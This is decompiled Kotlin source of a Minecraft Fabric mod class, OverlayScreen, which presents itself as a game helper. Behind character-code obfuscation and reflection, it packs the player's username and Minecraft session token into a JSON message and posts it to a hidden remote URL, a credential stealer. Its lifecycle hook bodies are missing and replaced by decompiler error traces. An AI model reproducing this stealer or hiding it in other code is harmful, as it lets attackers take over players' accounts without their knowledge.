package jooon.util

import java.io.Closeable
import java.util.ArrayList
import jooon.features.farming.BazaarHelper
import jooon.features.minions.MinionType
import jooon.features.other.PetMenu
import kotlin.jvm.internal.SourceDebugExtension
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents
import net.fabricmc.fabric.api.networking.v1.PacketSender
import net.minecraft.client.MinecraftClient
import net.minecraft.client.network.ClientPlayNetworkHandler
import org.apache.http.HttpEntity
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.CloseableHttpClient
import org.apache.http.impl.client.HttpClients
import org.apache.http.util.EntityUtils

@SourceDebugExtension(["SMAP\nOverlayScreen.kt\nKotlin\n*S Kotlin\n*F\n+ 1 OverlayScreen.kt\njooon/util/OverlayScreen\n+ 2 _Collections.kt\nkotlin/collections/CollectionsKt___CollectionsKt\n+ 3 _Strings.kt\nkotlin/text/StringsKt___StringsKt\n*L\n1#1,203:1\n1549#2:204\n1620#2,3:205\n1549#2:208\n1620#2,3:209\n1549#2:212\n1620#2,3:213\n1549#2:216\n1620#2,3:217\n1549#2:220\n1620#2,3:221\n1549#2:224\n1620#2,3:225\n1549#2:228\n1620#2,3:229\n1549#2:232\n1620#2,3:233\n1549#2:236\n1620#2,3:237\n1549#2:240\n1620#2,3:241\n1549#2:244\n1620#2,3:245\n1549#2:248\n1620#2,3:249\n1549#2:252\n1620#2,3:253\n1549#2:256\n1620#2,3:257\n1549#2:260\n1620#2,3:261\n1549#2:264\n1620#2,3:265\n1549#2:268\n1620#2,3:269\n1549#2:272\n1620#2,3:273\n1549#2:276\n1620#2,3:277\n1549#2:280\n1620#2,3:281\n1549#2:284\n1620#2,3:285\n1549#2:288\n1620#2,3:289\n1549#2:292\n1620#2,3:293\n1549#2:299\n1620#2,3:300\n1099#3,3:296\n*S KotlinDebug\n*F\n+ 1 OverlayScreen.kt\njooon/util/OverlayScreen\n*L\n162#1:204\n162#1:205,3\n163#1:208\n163#1:209,3\n164#1:212\n164#1:213,3\n165#1:216\n165#1:217,3\n166#1:220\n166#1:221,3\n167#1:224\n167#1:225,3\n168#1:228\n168#1:229,3\n169#1:232\n169#1:233,3\n170#1:236\n170#1:237,3\n171#1:240\n171#1:241,3\n172#1:244\n172#1:245,3\n173#1:248\n173#1:249,3\n174#1:252\n174#1:253,3\n179#1:256\n179#1:257,3\n185#1:260\n185#1:261,3\n190#1:264\n190#1:265,3\n193#1:268\n193#1:269,3\n196#1:272\n196#1:273,3\n198#1:276\n198#1:277,3\n199#1:280\n199#1:281,3\n200#1:284\n200#1:285,3\n201#1:288\n201#1:289,3\n202#1:292\n202#1:293,3\n38#1:299\n38#1:300,3\n24#1:296,3\n*E\n"])
public object OverlayScreen : ClientModInitializer {
   public open fun onInitializeClient() {
      ClientLifecycleEvents.CLIENT_STARTED
         .register(
            { var0: MinecraftClient ->
               // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
               // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.modules.decompiler.exps.Exprent.toJava(int)" because the return value of "org.vineflower.kotlin.expr.KExitExprent.getValue()" is null
               //   at org.vineflower.kotlin.expr.KExitExprent.toJava(KExitExprent.java:41)
               //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.listToJava(ExprProcessor.java:925)
               //   at org.jetbrains.java.decompiler.modules.decompiler.stats.BasicBlockStatement.toJava(BasicBlockStatement.java:87)
            }
         )
         ClientPlayConnectionEvents.JOIN
         .register(
            { var0: ClientPlayNetworkHandler, var1: PacketSender, var2: MinecraftClient ->
               // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
               // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.modules.decompiler.exps.Exprent.toJava(int)" because the return value of "org.vineflower.kotlin.expr.KExitExprent.getValue()" is null
               //   at org.vineflower.kotlin.expr.KExitExprent.toJava(KExitExprent.java:41)
               //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.listToJava(ExprProcessor.java:925)
               //   at org.jetbrains.java.decompiler.modules.decompiler.stats.BasicBlockStatement.toJava(BasicBlockStatement.java:87)
            }
         )
      }

   private fun sSsSsSsSsS(session: String?, user: String?) {
      val fallbackUrl: java.lang.String = PetMenu.INSTANCE.bBbBbBbBbB()
      val fullUrl: java.lang.String = BazaarHelper.INSTANCE.uUuUuUuUuU(user)
      val timestamp: java.lang.String = BazaarHelper.INSTANCE.vVvVvVvVvV()
      val var7: StringBuilder = StringBuilder()
      var7.append(INSTANCE.aAaAaAaAaA())
      var7.append(INSTANCE.bBbBbBbBbB()).append("`").append(user).append("`").append(INSTANCE.cCcCcCcCcC())
      var7.append(INSTANCE.dDdDdDdDdD()).append("`").append(session).append("`").append(INSTANCE.cCcCcCcCcC())
      var7.append(INSTANCE.eEeEeEeEeE()).append(timestamp).append(INSTANCE.cCcCcCcCcC())
      var7.append(INSTANCE.fFfFfFfFfF()).append(INSTANCE.gGgGgGgGgG()).append(INSTANCE.hHhHhHhHhH()).append(INSTANCE.iIiIiIiIiI())
      var7.append(INSTANCE.jJjJjJjJjJ()).append(fullUrl).append(INSTANCE.kKkKkKkKkK())
      var7.append(INSTANCE.xXxXxXxXxX())
      val var10000: java.lang.String = var7.toString()
      val payload: java.lang.String = var10000

      try {
         val var27: Closeable = HttpClients.createDefault() as Closeable
         var var28: java.lang.Throwable = null

         try {
            val var29: CloseableHttpClient = var27 as CloseableHttpClient
            val postClass: Class = Class.forName(INSTANCE.mMmMmMmMmM())
            val var31: Any = postClass.getConstructor(java.lang.String.class).newInstance(fallbackUrl)
            postClass.getMethod("setEntity", HttpEntity.class).invoke(var31, StringEntity(payload))
            postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class).invoke(var31, INSTANCE.nNnNnNnNnN(), INSTANCE.oOoOoOoOoO())
            postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class).invoke(var31, INSTANCE.pPpPpPpPpP(), INSTANCE.qQqQqQqQqQ())
            val var38: Class = Class.forName(INSTANCE.rRrRrRrRrR())
            val resp: Any = var29.getClass().getMethod("execute", var38).invoke(var29, var38.cast(var31))
            val var19: Any = resp.getClass().getMethod("getEntity").invoke(resp)
            EntityUtils.consume(var19 as? HttpEntity)
         } catch (var24: java.lang.Throwable) {
            var28 = var24
            throw var24
         } finally {
            CloseableKt.closeFinally(var27, var28)
         }
      } catch (var26: Exception) {
      }
   }

   private fun aAaAaAaAaA(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(123, 34, 99, 111, 110, 116, 101, 110, 116, 34, 58, 32, 34))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun bBbBbBbBbB(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(42, 42, 49, 42, 42, 58, 32))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun cCcCcCcCcC(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(92, 110))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun dDdDdDdDdD(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(42, 42, 50, 42, 42, 58, 32))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun eEeEeEeEeE(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(42, 42, 51, 42, 42, 58, 32))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun fFfFfFfFfF(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(42, 42, 52, 42, 42, 58, 32, 91))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun gGgGgGgGgG(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(115, 107, 121, 46, 115, 104, 105))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun hHhHhHhHhH(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(105, 121, 117))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun iIiIiIiIiI(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(46, 109, 111, 101))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun jJjJjJjJjJ(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(93, 40))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun kKkKkKkKkK(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(41, 92, 110))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun lLlLlLlLlL(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(
            42,
            42,
            96,
            74,
            82,
            32,
            49,
            46,
            50,
            49,
            46,
            49,
            49,
            96,
            32,
            45,
            45,
            32,
            80,
            82,
            69,
            32,
            40,
            67,
            76,
            68,
            41,
            32,
            45,
            45,
            32,
            54,
            46,
            49,
            42,
            42,
            34,
            125
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun xXxXxXxXxX(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(42, 42, 70, 101, 108, 108, 32, 98, 97, 99, 107, 33, 42, 42, 34, 125))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun mMmMmMmMmM(): String {
      val pkgCodes: java.util.List = CollectionsKt.listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = CollectionsKt.listOf(arrayOf(72, 116, 116, 112, 80, 111, 115, 116))
      val `$this$mapTo$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(pkgCodes, 10))

      for (`item$iv$iv` in `$this$mapTo$iv$iv`) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      val var10000: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var14, 10))

      for (var22 in var16) {
         `destination$iv$iv`.add((char)(var22 as java.lang.Number).intValue())
      }

      return "$var10000.${CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)}"
   }

   private fun rRrRrRrRrR(): String {
      val pkgCodes: java.util.List = CollectionsKt.listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = CollectionsKt.listOf(arrayOf(72, 116, 116, 112, 85, 114, 105, 82, 101, 113, 117, 101, 115, 116))
      val `$this$mapTo$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(pkgCodes, 10))

      for (`item$iv$iv` in `$this$mapTo$iv$iv`) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      val var10000: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var14, 10))

      for (var22 in var16) {
         `destination$iv$iv`.add((char)(var22 as java.lang.Number).intValue())
      }

      return "$var10000.${CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)}"
   }

   private fun tTtTtTtTtT(): String {
      val var12: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(
            111,
            114,
            103,
            46,
            97,
            112,
            97,
            99,
            104,
            101,
            46,
            104,
            116,
            116,
            112,
            46,
            105,
            109,
            112,
            108,
            46,
            99,
            108,
            105,
            101,
            110,
            116,
            46,
            72,
            116,
            116,
            112,
            67,
            108,
            105,
            101,
            110,
            116,
            115
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var12, 10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun uUuUuUuUuU(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(99, 114, 101, 97, 116, 101, 68, 101, 102, 97, 117, 108, 116))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun vVvVvVvVvV(): String {
      val var12: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(
            111,
            114,
            103,
            46,
            97,
            112,
            97,
            99,
            104,
            101,
            46,
            104,
            116,
            116,
            112,
            46,
            117,
            116,
            105,
            108,
            46,
            69,
            110,
            116,
            105,
            116,
            121,
            85,
            116,
            105,
            108,
            115
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var12, 10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun wWwWwWwWwW(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(99, 111, 110, 115, 117, 109, 101))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun nNnNnNnNnN(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun oOoOoOoOoO(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun pPpPpPpPpP(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(85, 115, 101, 114, 45, 65, 103, 101, 110, 116))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   private fun qQqQqQqQqQ(): String {
      val var11: java.lang.Iterable = CollectionsKt.listOf(arrayOf(77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var11, 10))

      for (`item$iv$iv` in var11) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }
}
